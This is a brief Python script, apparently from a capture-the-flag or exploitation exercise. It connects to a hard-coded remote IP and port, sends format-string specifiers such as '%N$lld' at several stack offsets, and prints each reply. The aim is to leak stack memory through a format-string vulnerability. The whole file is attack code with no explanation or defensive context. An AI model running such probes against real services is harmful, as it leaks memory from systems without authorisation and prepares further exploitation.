#!/usr/bin/env python3
import socket, time
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT))
print("INIT:", repr(s.recv(300)))
for n in [1,2,3,4,5,10,20,21,33,43]:
    s.send(("%%%d$lld\n" % n).encode())
    time.sleep(0.2)
    try:
        d=s.recv(4096)
    except Exception as e:
        d=b'<TIMEOUT '+str(e).encode()+b'>'
    print(f"after %{n}$lld:", repr(d))
s.close()
